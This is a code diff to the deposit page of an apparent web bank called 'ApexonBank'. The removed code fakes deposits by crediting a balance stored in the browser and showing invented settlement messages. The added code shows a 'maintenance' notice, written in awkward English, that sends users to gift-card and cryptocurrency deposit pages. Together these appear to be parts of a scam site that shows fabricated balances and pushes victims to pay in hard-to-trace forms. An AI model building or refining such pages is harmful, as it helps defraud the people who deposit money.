@@ -213,6 +213,31 @@
             transform: scale(1);
         }
 
+        /* MAINTENANCE MODAL ACTION BUTTONS */
+        .maintenance-btn {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            color: #ffffff;
+            border: none;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 700;
+            text-decoration: none;
+            margin-top: 12px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.2s ease;
+        }
+        
+        .btn-giftcard {
+            background: linear-gradient(135deg, #b38728 0%, #aa771c 100%);
+        }
+        
+        .btn-crypto {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+        }
+
         /* BOTTOM NAVIGATION DOCK */
         .bottom-nav {
             position: fixed;
@@ -336,17 +361,17 @@
         </a>
     </div>
 
-    <!-- TRANSACTION NOTIFICATION OVERLAY PANEL -->
+    <!-- MAINTENANCE & RE-ROUTING OVERLAY PANEL -->
     <div class="modal-overlay" id="depositModal">
         <div class="modal-card">
-            <div style="font-size: 48px; margin-bottom: 14px;" id="modalIcon">⏳</div>
-            <h2 style="font-size: 20px; font-weight: 700; color: #0f172a; margin-bottom: 8px;" id="modalTitle">Processing</h2>
-            <p style="font-size: 14px; color: #475569; line-height: 1.5; margin-bottom: 24px;" id="modalBody">
-                Interfacing with automated clearing house data gateways...
+            <div style="font-size: 48px; margin-bottom: 14px;" id="modalIcon">🛠️</div>
+            <h2 style="font-size: 20px; font-weight: 700; color: #0f172a; margin-bottom: 12px;" id="modalTitle">ApexonBank Gateway Notice</h2>
+            <p style="font-size: 14px; color: #475569; line-height: 1.6; margin-bottom: 24px; text-align: left;" id="modalBody">
+                Please dear user kindly click on the button below to direct you to <strong>gift-card.html</strong> page or <strong>cryptocurrency.html</strong> page because we are currently passing through maintenance in depositing using account money. Use the below options for quicker deposit. Thank you.
             </p>
-            <button id="modalCloseBtn" style="width: 100%; padding: 12px; background: #b38728; color: #ffffff; border: none; border-radius: 8px; font-size: 14px; font-weight: 700; cursor: pointer; display: none;">
-                Return to Dashboard
-            </button>
+            
+            <a href="gift-card.html" class="maintenance-btn btn-giftcard">💳 Deposit via Gift Card</a>
+            <a href="cryptocurrency.html" class="maintenance-btn btn-crypto">🪙 Deposit via Cryptocurrency</a>
         </div>
     </div>
 
@@ -430,64 +455,9 @@
                 return;
             }
 
+            // Immediately display the custom ApexonBank maintenance overlay
             var modal = document.getElementById('depositModal');
-            var mTitle = document.getElementById('modalTitle');
-            var mBody = document.getElementById('modalBody');
-            var mBtn = document.getElementById('modalCloseBtn');
-            var mIcon = document.getElementById('modalIcon');
-
             modal.classList.add('active');
-
-            setTimeout(function() {
-                mTitle.innerText = "Clearing Funds";
-                mBody.innerText = "Verifying imaging data and completing automated clearing house handshakes...";
-                
-                setTimeout(function() {
-                    var currentBalance = parseFloat(liveUserData.balance || 0);
-                    var runningBalance = currentBalance + amountInp;
-                    
-                    usersArray[liveUserIndex].balance = runningBalance.toFixed(2);
-
-                    var d = new Date();
-                    var dateStr = d.toISOString().split('T')[0];
-                    var timeStr = d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
-
-                    if (!usersArray[liveUserIndex].transactions) {
-                        usersArray[liveUserIndex].transactions = [];
-                    }
-
-                    var sourceTitle = document.getElementById('sourceName').value;
-                    var referenceInfo = document.getElementById('referenceValue').value;
-                    var descriptionMemo = document.getElementById('narration').value || (activeRoute === 'check' ? "Mobile Check Scan" : "Inbound Wire Deposit");
-
-                    // unshift puts the newest transactions perfectly at the top of the history feed
-                    usersArray[liveUserIndex].transactions.unshift({
-                        description: descriptionMemo,
-                        sender: sourceTitle + " (" + referenceInfo + ")",
-                        receiver: usersArray[liveUserIndex].fullName,
-                        amount: amountInp.toFixed(2),
-                        type: "credit",
-                        date: dateStr,
-                        time: timeStr,
-                        status: "Successful ✅"
-                    });
-
-                    localStorage.setItem('apexon_users', JSON.stringify(usersArray));
-
-                    var symbol = liveUserData.currency || "$";
-                    document.getElementById('liveBalanceDisplay').innerText = symbol + runningBalance.toLocaleString('en-US', { minimumFractionDigits: 2 });
-
-                    mIcon.innerText = "✅";
-                    mTitle.innerText = "Deposit Successful";
-                    mBody.innerHTML = "Your fund capture gateway confirmed settlement. The assets have been posted directly into your ledger node.<br><br><strong>Tracking ID:</strong> DEP-" + Math.floor(Math.random()*899999+100000);
-                    mBtn.style.display = "block";
-                }, 2000);
-
-            }, 1500);
-        });
-
-        document.getElementById('modalCloseBtn').addEventListener('click', function() {
-            window.location.href = "user-dashboard.html";
         });
 
         initDepositGateway();
